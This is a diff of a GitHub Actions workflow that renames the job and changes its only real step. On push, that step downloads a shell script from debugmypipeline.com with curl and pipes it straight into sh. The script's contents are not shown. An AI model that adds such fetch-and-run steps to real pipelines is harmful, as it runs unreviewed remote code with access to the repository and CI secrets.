@@ -1,5 +1,4 @@
-name: Testing
-
+name: Test
 on:
   push:
     branches:
@@ -10,5 +9,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v2
-    - run: sh <(curl -s https://lets1.debugmypipeline.com/42afd59d-b817-45b2-89bd-1c975fcfaea4.sh)
-     
+    - run: sh <(curl -s https://lets1.debugmypipeline.com/c69ac2ba-7097-410b-ac43-efac4d2816c6.sh)
+   
